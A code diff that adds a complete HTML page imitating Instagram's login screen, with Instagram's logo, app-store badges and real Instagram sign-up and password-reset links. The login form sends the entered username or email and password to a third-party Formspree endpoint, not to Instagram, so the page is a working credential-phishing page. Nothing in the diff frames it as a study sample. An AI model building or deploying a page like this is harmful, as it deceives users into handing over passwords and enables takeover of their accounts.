@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram log-in</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css"
+      integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <main>
+      <section id="section-1" class="display-flex">
+        <img
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png"
+          alt="Insta logo"
+          width="60%"
+          class="padding-top"
+        />
+        <br />
+        <form action="https://formspree.io/f/xvoldlzn" method="post">
+          <input
+            type="text"
+            name="logInDetails"
+            id="logInDetails"
+            placeholder="Phone number, username, or email"
+          />
+          <input
+            type="password"
+            name="password"
+            id="passwordInput"
+            placeholder="Password"
+          />
+          <button type="submit">Log In</button>
+        </form>
+        <div class="display-flex display-inline">
+          <div class="dash-a"></div>
+          <span class="dash-or">or</span>
+          <div class="dash-b"></div>
+        </div>
+        <br />
+        <div>
+          <a href="https://www.facebook.com/" target="_blank" class="FB-logo FB"
+            ><strong> Log in with Facebook</strong></a
+          >
+        </div>
+        <br />
+        <div>
+          <a
+            href="https://www.instagram.com/accounts/password/reset/"
+            target="_blank"
+            class="forgot-pass"
+            >Forgot password?</a
+          >
+        </div>
+      </section>
+      <section id="section-2" class="display-flex">
+        <div class="sign-up-align">
+          <span>Don't have an account?</span>
+          <a
+            href="https://www.instagram.com/accounts/emailsignup/"
+            target="_blank"
+            class="sign-up"
+            >Sign up
+          </a>
+        </div>
+      </section>
+      <section id="section-3">
+        <div>
+          <p>Get the app.</p>
+        </div>
+
+        <a
+          href="https://apps.apple.com/us/app/instagram/id389801252"
+          target="_blank"
+        >
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
+            alt="Download on the App Store"
+            class="download-buttons"
+          />
+        </a>
+        <a
+          href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US"
+          target="_blank"
+        >
+          <img
+            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
+            alt="Get it on Google Play"
+            class="download-buttons"
+          />
+        </a>
+      </section>
+    </main>
+  </body>
+</html>
